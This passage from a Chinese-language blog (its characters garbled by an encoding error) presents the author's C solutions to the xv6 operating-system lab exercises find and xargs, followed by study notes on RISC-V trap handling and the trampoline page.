ret=fun(p[rd],c[wt]);</span><br><span class="line">            close(p[rd]);</span><br><span class="line">            <span class="keyword">if</span>(ret==<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            p[rd]=c[rd];</span><br><span class="line">            p[wt]=c[wt];</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(p[wt])&#123;</span><br><span class="line">                close(p[wt]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(p[rd])&#123;</span><br><span class="line">                close(p[rd]);</span><br><span class="line">            &#125;</span><br><span class="line">            wait(&amp;status);</span><br><span class="line">            <span class="keyword">if</span>(status==<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="number">2</span>,<span class="string">&quot;wait fail\n&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="find"><a href="#find" class="headerlink" title="find"></a>find</h4><p>è¿™ä¸ªè°ƒäº†æˆ‘åŠä¸ªæ—©ä¸ŠğŸ¤¦â€â™€ï¸ï¼Œé¦–å…ˆæ˜¯ç¨‹åºé€€å‡ºæ—¶æŠ¥é”™ï¼Œæˆ‘è¯•äº†åŠå¤©æ‰å‘ç°xv6ç³»ç»Ÿçš„mainå‡½æ•°åªèƒ½ä»¥exit()é€€å‡ºï¼Œå…¶æ¬¡æ˜¯æµ‹è¯•ç¨‹åºè€æ˜¯è¿‡ä¸å»ï¼Œå¤šæ–¹è°ƒè¯•åå‘ç°è‡ªå·±çš„ä¸€å—é€»è¾‘å†™çš„æœ‰æ˜æ˜¾é—®é¢˜ï¼Œå‘œå‘œå‘œè¿™æ˜æ˜åªæ˜¯ä¸­ç­‰éš¾åº¦ï¼Œä»£ç èƒ½åŠ›è¿˜æ˜¯å¤ªèœäº†ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernel/stat.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;user/user.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernel/fs.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">find</span><span class="params">(<span class="keyword">char</span> *file_path,<span class="keyword">char</span> *res)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dirent</span> <span class="title">de</span>;</span></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="keyword">char</span> *p;</span><br><span class="line">    memmove(buf,file_path,<span class="built_in">strlen</span>(file_path));</span><br><span class="line">    <span class="keyword">int</span> fd=open(file_path,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="number">2</span>,<span class="string">&quot;open fail\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (read(fd,&amp;de,<span class="keyword">sizeof</span>(de))==<span class="keyword">sizeof</span>(de))&#123;</span><br><span class="line">        <span class="keyword">if</span>(de.inum==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(de.name,<span class="string">&quot;.&quot;</span>)||!<span class="built_in">strcmp</span>(de.name,<span class="string">&quot;..&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        p=buf+<span class="built_in">strlen</span>(buf);</span><br><span class="line">        memmove(p, de.name, DIRSIZ);</span><br><span class="line">        <span class="keyword">if</span>(stat(buf,&amp;st)&lt;<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="number">2</span>,<span class="string">&quot;stat() fail filename :%s\n&quot;</span>,buf);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(st.type==T_FILE)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(de.name,res))&#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="number">1</span>,<span class="string">&quot;%s\n&quot;</span>,buf);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span> (st.type==T_DIR)</span><br><span class="line">        &#123;</span><br><span class="line">            p=buf+<span class="built_in">strlen</span>(buf);</span><br><span class="line">            *p=<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">            find(buf,res);</span><br><span class="line">        &#125;</span><br><span class="line">         <span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">         memmove(buf,file_path,<span class="number">100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">char</span> *p;</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="keyword">if</span>(argc!=<span class="number">3</span>)&#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="number">2</span>,<span class="string">&quot;parameter fail\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    memmove(buf,argv[<span class="number">1</span>],DIRSIZ);</span><br><span class="line">    p=buf+<span class="built_in">strlen</span>(buf)<span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span>(*p!=<span class="string">&#x27;/&#x27;</span>)&#123;</span><br><span class="line">        p++;</span><br><span class="line">        *p=<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    find(buf,argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="xargs"><a href="#xargs" class="headerlink" title="xargs"></a>xargs</h4><p>ä¸»è¦éº»çƒ¦çš„ç‚¹åœ¨å¯¹å­—ç¬¦ä¸²çš„å¤„ç†ä¸Šï¼Œæˆ‘çœ‹åˆ«äººçš„åšå®¢åˆ©ç”¨äº†æœ‰é™è‡ªåŠ¨æœºï¼Œå˜¿å˜¿ï¼Œä¸ä¼šè¿™ä¸ªé«˜ç«¯çš„ä¸œè¥¿ï¼Œæˆ‘çš„è§£å†³åŠæ³•æ˜¯å¯¹å¾—åˆ°çš„å­—ç¬¦ä¸²è¿›è¡Œæ ‡å‡†åŒ–ï¼Œç„¶åå°±åˆ©äºåé¢çš„å­—ç¬¦ä¸²å¤„ç†äº†(æ— è„‘åšæ³•å±äº)ã€‚è¿˜æœ‰æˆ‘çš„ä»£ç èƒ½åŠ›çœŸå¾—å¼±ï¼Œè¿™ç‚¹ä»£ç èŠ±äº†æˆ‘ä¸¤ä¸ªå°æ—¶ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernel/stat.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;user/user.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernel/fs.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_line_length</span><span class="params">(<span class="keyword">char</span> *buf)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> line_length=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(buf[line_length]!=<span class="string">&#x27;\n&#x27;</span>)&#123;</span><br><span class="line">        line_length++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> line_length;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> cur=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> line_num=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line">    <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="number">2</span>,<span class="string">&quot;argv fail\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> size=read(<span class="number">0</span>,buf,<span class="number">100</span>);</span><br><span class="line">    <span class="keyword">char</span> parm_buf[size+<span class="number">20</span>];</span><br><span class="line">    <span class="built_in">memset</span>(parm_buf,<span class="number">0</span>,<span class="keyword">sizeof</span>(parm_buf));</span><br><span class="line">    cur++;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;size; i++,cur++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(buf[i]==<span class="string">&#x27; &#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(buf[i]==<span class="string">&#x27;\n&#x27;</span>)&#123;</span><br><span class="line">            cur++;</span><br><span class="line">            parm_buf[cur]=<span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">            line_num++;</span><br><span class="line">            cur++;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        parm_buf[cur]=buf[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(buf[size<span class="number">-1</span>]!=<span class="string">&#x27;\n&#x27;</span>)&#123;</span><br><span class="line">        line_num++;</span><br><span class="line">    &#125;</span><br><span class="line">    cur=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;line_num;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> add_parm_num=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> temp_cur=cur;</span><br><span class="line">        <span class="keyword">for</span>(;parm_buf[temp_cur]!=<span class="string">&#x27;\n&#x27;</span>;temp_cur++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(parm_buf[temp_cur]==<span class="number">0</span>&amp;&amp;parm_buf[temp_cur+<span class="number">1</span>]!=<span class="number">0</span>&amp;&amp;parm_buf[temp_cur+<span class="number">1</span>]!=<span class="string">&#x27;\n&#x27;</span>)&#123;</span><br><span class="line">                add_parm_num++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">char</span> *parm[add_parm_num+argc];</span><br><span class="line">        <span class="built_in">memset</span>(parm,<span class="number">0</span>,<span class="keyword">sizeof</span>(parm));</span><br><span class="line">        <span class="keyword">int</span> parm_cur=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;argc;j++,parm_cur++)&#123;</span><br><span class="line">            parm[parm_cur]=argv[j];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(;parm_buf[cur]!=<span class="string">&#x27;\n&#x27;</span>;cur++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(parm_buf[cur]==<span class="number">0</span>&amp;&amp;parm_buf[cur+<span class="number">1</span>]!=<span class="number">0</span>&amp;&amp;parm_buf[cur+<span class="number">1</span>]!=<span class="string">&#x27;\n&#x27;</span>)&#123;</span><br><span class="line">                parm[parm_cur]=&amp;parm_buf[cur+<span class="number">1</span>];</span><br><span class="line">                parm_cur++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        cur++;</span><br><span class="line">        <span class="keyword">int</span> pid=fork();</span><br><span class="line">        <span class="keyword">if</span>(pid==<span class="number">0</span>)&#123;</span><br><span class="line">            exec(parm[<span class="number">0</span>],parm);</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="number">2</span>,<span class="string">&quot;exec fail\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            wait(&amp;status);</span><br><span class="line">            <span class="keyword">if</span>(status==<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="number">2</span>,<span class="string">&quot; wait fail\n&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="æœ€ålabå¾—åˆ†"><a href="#æœ€ålabå¾—åˆ†" class="headerlink" title="æœ€ålabå¾—åˆ†"></a>æœ€ålabå¾—åˆ†</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Score: 100/100</span><br></pre></td></tr></table></figure>

<h4 id="ç»“è¯­"><a href="#ç»“è¯­" class="headerlink" title="ç»“è¯­"></a>ç»“è¯­</h4><p>åœ¨xv6æ“ä½œç³»ç»Ÿä¸Šç¼–ç¨‹å¾ˆå¥‡å¦™ä¹Ÿå¾ˆæœ‰æ„æ€ã€‚</p>
<h3 id="Lab2-system-calls"><a href="#Lab2-system-calls" class="headerlink" title="Lab2: system calls"></a>Lab2: system calls</h3><p>è¿™ä¸ªå®éªŒä¸»è¦æ˜¯ä¸ºäº†ç†è§£ç³»ç»Ÿè°ƒç”¨çš„å·¥ä½œæµç¨‹ï¼Œå¹¶ä¸ºxv6å¢åŠ ä¸€äº›æ–°çš„ç³»ç»Ÿè°ƒç”¨ã€‚</p>
<h4 id="book-read-2"><a href="#book-read-2" class="headerlink" title="book-read"></a>book-read</h4><h5 id="trap"><a href="#trap" class="headerlink" title="trap"></a>trap</h5><p>æœ‰ä¸‰ç§æ—¶é—´å¯¼è‡´cpuæç½®æ™®é€šæŒ‡ä»¤çš„æ‰§è¡Œï¼Œå¼ºåˆ¶å°†æ§åˆ¶æƒè½¬ç§»ç»™å¤„ç†è¯¥äº‹ä»¶çš„ç‰¹æ®Šä»£ç ä¸Šï¼Œä¸€ç§æƒ…å†µæ˜¯ç³»ç»Ÿè°ƒç”¨ä½¿ç”¨<code>ecall</code>çš„æ—¶å€™ï¼Œä¸€ç§æ˜¯å¼‚å¸¸ï¼Œæ¯”å¦‚user/kernelæŒ‡ä»¤åšäº†ä¸€äº›éæ³•çš„äº‹æƒ…å¦‚é™¤é›¶ï¼Œç¬¬ä¸‰ç§æ˜¯è®¾å¤‡ä¸­æ–­ï¼Œè¿™ä¸‰ç§æƒ…å†µè¢«ç»Ÿç§°ä¸º<code>trap</code>,xv6å†…æ ¸å¤„ç†æ‰€æœ‰çš„trap.</p>
<h5 id="risc-vé™·å…¥æœºåˆ¶"><a href="#risc-vé™·å…¥æœºåˆ¶" class="headerlink" title="risc-vé™·å…¥æœºåˆ¶"></a>risc-vé™·å…¥æœºåˆ¶</h5><p>risc-væ¶æ„çš„cpuéƒ½æœ‰ä¸€ç»„æ§åˆ¶å¯„å­˜å™¨ï¼Œkernelé€šè¿‡å‘è¿™äº›å¯„å­˜å™¨å†™å…¥å†…å®¹æ¥ä½¿cpuå¤„ç†trap</p>
<p>ä¸‹é¢æ˜¯é‡è¦çš„å¯„å­˜å™¨</p>
<blockquote>
<p><code>stvec</code>:å†…æ ¸åœ¨è¿™é‡Œå†™å…¥trapå¤„ç†ç¨‹åºçš„åœ°å€ï¼Œrisc-vè·³è½¬åˆ°è¿™é‡Œå¤„ç†trap</p>
<p><code>sepc</code>:å½“å‘ç”Ÿtrapæ—¶ï¼Œrisc-vä¼šä¿å­˜åŸæ¥<code>pc</code>çš„ä¿¡æ¯åˆ°<code>sepc</code>,<code>sret</code>(ä»é™·é˜±è¿”å›)æŒ‡ä»¤å°±ä¼šå°†<code>sepc</code>å¤åˆ¶åˆ°<code>pc</code>,å†…æ ¸å¯ä»¥å†™å…¥<code>sepc</code>æ¥æ§åˆ¶<code>sret</code>çš„å»å‘ã€‚</p>
<p><code>scause</code>:risc-våœ¨è¿™é‡Œé˜²æ­¢æè¿°trapåŸå› çš„æ•°å­—</p>
<p><code>sscratch</code>:å†…æ ¸åœ¨è¿™é‡Œæ”¾ç½®ä¸€ä¸ªå€¼ï¼Œè¿™ä¸ªå€¼åœ¨trapå¤„ç†ç¨‹åºä¸€å¼€å§‹å°±ä¼šæ´¾ä¸Šç”¨åœºã€‚</p>
<p><code>sstatus</code>:å…¶ä¸­çš„<code>SIE</code>ä½æ§åˆ¶è®¾å¤‡ä¸­æ–­æ˜¯å¦å¯åŠ¨ï¼Œ<code>SPP</code>ä½æŒ‡ç¤ºtrapæ˜¯æ¥è‡ªuser-modeè¿˜æ˜¯kernel-mode,å¹¶æ§åˆ¶<code>sret</code>è¿”å›çš„æ¨¡å¼</p>
</blockquote>
<p>risc-vç¡¬ä»¶å¯¹æ‰€æœ‰trap(é™¤äº†è®¡æ—¶å™¨ä¸­æ–­)æ‰§è¡Œä»¥ä¸‹æ“ä½œ</p>
<blockquote>
<ol>
<li>å¦‚æœé™·é˜±æ˜¯è®¾å¤‡ä¸­æ–­ï¼Œå¹¶ä¸”çŠ¶æ€<strong>SIE</strong>ä½è¢«æ¸…ç©ºï¼Œåˆ™ä¸æ‰§è¡Œä»¥ä¸‹ä»»ä½•æ“ä½œã€‚</li>
<li>æ¸…é™¤<strong>SIE</strong>ä»¥ç¦ç”¨ä¸­æ–­ã€‚</li>
<li>å°†<code>pc</code>å¤åˆ¶åˆ°<code>sepc</code>ã€‚</li>
<li>å°†å½“å‰æ¨¡å¼ï¼ˆç”¨æˆ·æˆ–ç®¡ç†ï¼‰ä¿å­˜åœ¨çŠ¶æ€çš„<strong>SPP</strong>ä½ä¸­ã€‚</li>
<li>è®¾ç½®<code>scause</code>ä»¥åæ˜ äº§ç”Ÿé™·é˜±çš„åŸå› ã€‚</li>
<li>å°†æ¨¡å¼è®¾ç½®ä¸ºç®¡ç†æ¨¡å¼ã€‚</li>
<li>å°†<code>stvec</code>å¤åˆ¶åˆ°<code>pc</code>ã€‚</li>
<li>åœ¨æ–°çš„<code>pc</code>ä¸Šå¼€å§‹æ‰§è¡Œã€‚</li>
</ol>
</blockquote>
<p>å¯è§cpuç¡¬ä»¶åªä¼šæ‰§è¡Œè¿™äº›æ“ä½œï¼Œå½“æ§åˆ¶æƒç»™åˆ°å†…æ ¸çš„æ—¶å€™ï¼Œå¾—è¦å†…æ ¸è‡ªå·±å®Œæˆå¯¹å†…æ ¸é¡µè¡¨çš„åˆ‡æ¢ï¼Œå¯¹å†…æ ¸æ ˆçš„åˆ‡æ¢ï¼Œç„¶åè¿›å…¥å¯¹trapçœŸæ­£å¤„ç†çš„å‡½æ•°ä¸Šï¼Œå¯¹é™¤äº†<code>pc</code>ä»¥å¤–æ‰€æœ‰å¯„å­˜å™¨çš„ä¿å­˜ã€‚</p>
<h5 id="ä»ç”¨æˆ·ç©ºé—´é™·å…¥"><a href="#ä»ç”¨æˆ·ç©ºé—´é™·å…¥" class="headerlink" title="ä»ç”¨æˆ·ç©ºé—´é™·å…¥"></a>ä»ç”¨æˆ·ç©ºé—´é™·å…¥</h5><p><img src="http://xv6.dgs.zone/tranlate_books/book-riscv-rev1/images/c2/p2.png" alt="img"></p>
<p>æ€»ä½“åˆ†ä¸ºå››æ­¥è°ƒç”¨ï¼Œ<code>uservec</code>,<code>usertrap</code>,<code>usertrapret</code>å’Œ<code>userret</code>ã€‚</p>
<p><strong>uservec</strong></p>
<p><code>uservec</code>ä»£ç å¤„äº<code>kernel/trampoline.S</code>ä¸­ï¼Œä¸€çŒœå°±æ˜¯ç”¨æ±‡ç¼–å†™çš„ï¼Œå› ä¸ºæ§åˆ¶å•ä½åˆ°äº†å¯„å­˜å™¨é‡çº§ï¼Œä½†æ˜¯æ˜¯risc-væï¼Œçœ‹ä¸å¤ªæ‡‚ã€‚å¦‚ä¸Šé¢æ‰€è¯´ï¼Œkernel-modeå¾—å®Œæˆé‚£äº›æ“ä½œæ‰å¯ä»¥è¿›å…¥å¯¹trapçœŸæ­£å¤„ç†çš„å‡½æ•°ä¸Šï¼ˆ<code>usertrap</code>ï¼‰ï¼Œè€Œè¿™äº›æ“ä½œéƒ½è¢«æ”¾ç½®åœ¨<code>uservec</code>ä¸­ï¼Œå³åˆšå¼€å§‹çš„<code>stvec</code>æŒ‡å‘äº†<code>uservec</code>,ä½†æ˜¯åˆšè¿›å…¥kernel-modeçš„æ—¶å€™<code>satp</code>å¹¶æ²¡æœ‰æŒ‡å‘<code>kernel-page</code>,è€Œæ˜¯åœ¨<code>user-page</code>ä¸­ï¼Œè¦æƒ³æ‰§è¡Œ<code>uservec</code>åˆ™å¿…é¡»åœ¨ç”¨æˆ·é¡µè¡¨ä¸­ä¹Ÿæ˜ å°„ä¸Š,åœ¨<code>uservec</code>ä¸­ä¼šåˆ‡æ¢<code>satp</code>ä»¥æŒ‡å‘å†…æ ¸é¡µè¡¨ï¼Œæ‰€ä»¥ä¸ºäº†åœ¨åˆ‡æ¢åç»§ç»­æ‰§è¡ŒæŒ‡ä»¤ï¼Œ<code>uservec</code>å¿…é¡»åœ¨å†…æ ¸é¡µè¡¨å’Œç”¨æˆ·é¡µè¡¨ä¸­æ˜ å°„ç›¸åŒçš„åœ°å€ã€‚</p>
<p>ä¸ºæ­¤xv6ä¸“é—¨è®¾ç½®äº†ä¸€ä¸ªé¡µé¢æ”¾ç½®<code>uservec</code>ä»£ç ï¼Œç„¶åæŠŠè¿™ä¸ªé¡µé¢æ˜ å°„åˆ°å†…æ ¸é¡µè¡¨å’Œæ‰€æœ‰çš„ç”¨æˆ·é¡µè¡¨ä¸­ï¼Œä¸”è™šæ‹Ÿåœ°å€å…¨éƒ¨ç›¸åŒï¼Œè¿™ä¸ªè™šæ‹Ÿåœ°å€å°±æ˜¯ä¸Šå›¾çš„<code>trampoline</code>,åœ¨user-modeæ—¶stvecå°±æŒ‡å‘äº†<code>trampoline</code>å³<code>userevc</code>ã€‚</p>
<p>åˆ°è¿™é‡Œæˆ‘è§‰å¾—ååˆ†åˆç†ï¼Œå¯èƒ½x86ä¹Ÿæ˜¯è¿™æ ·å¹²çš„ï¼Œå½“<code>userevc</code>å¯åŠ¨çš„æ—¶å€™ï¼Œæ‰€æœ‰çš„32ä¸ªå¯„å­˜å™¨éƒ½ä¿å­˜ç€åŸæ¥ä¸­æ–­ä»£ç çš„å€¼ï¼Œä¸èƒ½å¤Ÿéšæ„æ›´æ”¹ï¼Œä½†<code>userevc</code>éœ€è¦èƒ½å¤Ÿä½¿ç”¨ä¸€äº›å¯„å­˜å™¨æ‰èƒ½å®Œæˆä»–çš„åŠŸèƒ½ï¼Œrisc-vçš„<code>sscratch</code>å°±å‘æŒ¥äº†ä½œç”¨ï¼Œ<code>userevc</code>å¼€å§‹çš„æ—¶å€™é€šè¿‡æŒ‡ä»¤<code>csrrw</code>äº¤æ¢äº†<code>a0</code>å’Œ<code>sscratch</code>çš„å†…å®¹ï¼Œæ­¤æ—¶<code>a0</code>å¯„å­˜å™¨çš„å€¼å°±è¢«ä¿å­˜äº†ï¼Œ<code>uservec</code>å°±å¯ä»¥ä½¿ç”¨<code>a0</code>å¯„å­˜å™¨äº†ã€‚</p>
